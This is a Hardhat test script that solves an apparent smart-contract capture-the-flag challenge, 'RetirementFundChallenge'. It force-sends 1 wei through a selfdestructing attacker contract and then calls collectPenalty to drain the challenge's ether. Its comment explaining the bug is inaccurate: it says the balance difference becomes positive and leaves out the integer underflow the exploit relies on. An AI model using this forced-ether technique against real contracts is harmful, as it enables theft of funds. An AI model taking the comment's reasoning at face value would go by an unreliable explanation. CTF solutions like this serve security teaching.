import { ethers } from "hardhat";
import { expect } from "chai";

describe("RetirementFundChallenge", function () {
  it("should exploit the contract by triggering collectPenalty via selfdestruct", async function () {
    const [player, attackerEOA] = await ethers.getSigners();

    // Step 1: Deploy the vulnerable challenge contract with 1 ether
    const ChallengeFactory = await ethers.getContractFactory("RetirementFundChallenge");
    const challenge = await ChallengeFactory.connect(player).deploy(player.address, {
      value: ethers.utils.parseEther("1.0"),
    });
    await challenge.deployed();
    console.log("Challenge deployed at:", challenge.address);

    // Step 2: Deploy the attacker contract with a small balance (e.g., 1 wei)
    const AttackerFactory = await ethers.getContractFactory("RetirementFundAttacker");
    const attackerContract = await AttackerFactory.connect(attackerEOA).deploy();

    const smallAmount = ethers.utils.parseUnits("1", "wei");
    console.log("Sending", smallAmount.toString(), "wei using selfdestruct...");

    // Step 3: Call destroyAndSend to forcibly transfer 1 wei to the challenge
    const destroyTx = await attackerContract
      .connect(attackerEOA)
      .destroyAndSend(challenge.address, { value: smallAmount });
    await destroyTx.wait();

    // Explanation:
    // The challenge contract stores the original deposit (startBalance),
    // and relies on address(this).balance to detect early withdrawals.
    //
    // However, by forcibly sending ETH via selfdestruct, we artificially
    // increase the contract balance without changing startBalance.
    //
    // This causes (startBalance - currentBalance) to be > 0,
    // which triggers the 'early withdrawal detected' condition in collectPenalty().

    const balanceAfterInject = await ethers.provider.getBalance(challenge.address);
    console.log("Challenge contract balance after selfdestruct injection:", balanceAfterInject.toString());

    // Step 4: As the player (beneficiary), call collectPenalty
    const penaltyTx = await challenge.connect(player).collectPenalty();
    await penaltyTx.wait();
    console.log("collectPenalty executed by player");

// Step 5: Check if challenge is completed (balance should be 0)
    const isComplete = await challenge.isComplete();
    expect(isComplete).to.be.true;
    console.log("Challenge solved");
  });
});
